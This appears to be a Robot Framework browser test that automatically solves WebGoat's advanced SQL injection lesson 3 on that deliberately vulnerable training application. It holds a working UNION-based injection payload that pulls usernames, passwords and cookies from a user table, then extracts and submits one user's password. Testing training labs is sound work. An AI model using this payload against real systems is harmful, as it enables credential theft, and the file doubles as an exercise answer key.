*** Settings ***
Library        Browser
Library        OperatingSystem
Library        String
Resource       ${EXECDIR}${/}resources${/}keywords${/}webgoat_keywords.robot

*** Test Cases ***
Test SQL Injection Advanced 3
    [Documentation]            Test case for SQL Injection advanced task 3 in WebGoat.
    Open and Log In to Webgoat
    Click                      text="(A3) Injection"
    Click                      text="SQL Injection (advanced)"
    Click                      text="3"

    Fill Text                  xpath=${WEBGOAT_SLCTRS_23}form[1]/table/tbody/tr/td[2]/input    ' or 1=1 union select userid as userid2, user_name, password, cookie,'','',0 from user_system_data; --
    Click                      xpath=${WEBGOAT_SLCTRS_23}form[1]/table/tbody/tr/td[3]/input
    Wait For Elements State    xpath=${WEBGOAT_SLCTRS_23}div[2]     visible      timeout=5s
    ${text}=                   Get Text          xpath=${WEBGOAT_SLCTRS_23}div[2]
    
    ${html}=           Get Property    xpath=(//*[@class="attack-feedback"])[1]    innerHTML
    ${cleaned}=        Replace String    ${html}    <br>    \n
    ${lines}=          Split String      ${cleaned}    \n
    ${password}=       Set Variable      ${EMPTY}
    FOR    ${line}    IN    @{lines}
        ${line}=       Strip String    ${line}
        Run Keyword If    'dave' in '${line}'    Set Suite Variable    ${password}    ${line.split(',')[2].strip()}
    END
    Fill Text                  xpath=${WEBGOAT_SLCTRS_23}form[2]/table/tbody/tr/td[2]/input    ${password}
    Click                      xpath=${WEBGOAT_SLCTRS_23}form[2]/table/tbody/tr/td[3]/input

    Wait For Elements State    xpath=${WEBGOAT_SLCTRS_23}div[2]     visible      timeout=5s
    ${feedback}=               Get Text          xpath=${WEBGOAT_SLCTRS_23}div[2]
    Should Contain             ${feedback}    Congratulations
